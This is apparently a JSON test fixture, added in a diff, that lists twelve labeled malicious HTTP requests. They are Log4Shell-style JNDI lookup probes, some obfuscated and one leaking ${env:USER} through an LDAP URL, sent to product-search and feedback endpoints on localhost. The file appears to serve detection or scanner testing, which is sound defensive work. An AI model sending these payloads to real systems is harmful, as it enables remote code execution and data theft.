@@ -1,0 +1,93 @@
+{
+  "_comment": "JNDI / Log4Shell-style lookup probes. Local range only.",
+  "dossier": {
+    "techniques": [
+      "other"
+    ],
+    "attack_class": "other",
+    "endpoints": [
+      "/rest/products/search",
+      "/api/Feedbacks/"
+    ]
+  },
+  "requests": [
+    {
+      "method": "GET",
+      "uri": "/rest/products/search?q=%24%7Bjndi%3Aldap%3A%2F%2F127.0.0.1%3A1389%2Fa%7D",
+      "body": "",
+      "malicious": true
+    },
+    {
+      "method": "GET",
+      "uri": "/rest/products/search?q=%24%7Bjndi%3Armi%3A%2F%2F127.0.0.1%3A1099%2Fa%7D",
+      "body": "",
+      "malicious": true
+    },
+    {
+      "method": "GET",
+      "uri": "/rest/products/search?q=%24%7B%24%7Blower%3Aj%7Dndi%3Aldap%3A%2F%2F127.0.0.1%2Fa%7D",
+      "body": "",
+      "malicious": true
+    },
+    {
+      "method": "GET",
+      "uri": "/rest/products/search?q=%24%7Bjndi%3Adns%3A%2F%2F127.0.0.1%2Fa%7D",
+      "body": "",
+      "malicious": true
+    },
+    {
+      "method": "GET",
+      "uri": "/rest/products/search?q=%24%7B%24%7B%3A%3A-j%7D%24%7B%3A%3A-n%7D%24%7B%3A%3A-d%7D%24%7B%3A%3A-i%7D%3Aldap%3A%2F%2F127.0.0.1%2Fa%7D",
+      "body": "",
+      "malicious": true
+    },
+    {
+      "method": "GET",
+      "uri": "/rest/products/search?q=%24%7Bjndi%3Aldap%3A%2F%2Flocalhost%3A1389%2Fx%7D",
+      "body": "",
+      "malicious": true
+    },
+    {
+      "method": "POST",
+      "uri": "/api/Feedbacks/",
+      "body": "{\"comment\": \"nice ${jndi:ldap://127.0.0.1:1389/a}\", \"rating\": 3}",
+      "content_type": "application/json",
+      "malicious": true
+    },
+    {
+      "method": "POST",
+      "uri": "/api/Feedbacks/",
+      "body": "{\"comment\": \"nice ${jndi:rmi://127.0.0.1:1099/b}\", \"rating\": 3}",
+      "content_type": "application/json",
+      "malicious": true
+    },
+    {
+      "method": "POST",
+      "uri": "/api/Feedbacks/",
+      "body": "{\"comment\": \"nice ${${lower:j}ndi:ldap://127.0.0.1/c}\", \"rating\": 3}",
+      "content_type": "application/json",
+      "malicious": true
+    },
+    {
+      "method": "POST",
+      "uri": "/api/Feedbacks/",
+      "body": "{\"comment\": \"nice ${env:USER}\", \"rating\": 3}",
+      "content_type": "application/json",
+      "malicious": true
+    },
+    {
+      "method": "POST",
+      "uri": "/api/Feedbacks/",
+      "body": "{\"comment\": \"nice ${sys:java.version}\", \"rating\": 3}",
+      "content_type": "application/json",
+      "malicious": true
+    },
+    {
+      "method": "POST",
+      "uri": "/api/Feedbacks/",
+      "body": "{\"comment\": \"nice ${jndi:ldap://127.0.0.1/${env:USER}}\", \"rating\": 3}",
+      "content_type": "application/json",
+      "malicious": true
+    }
+  ]
+}
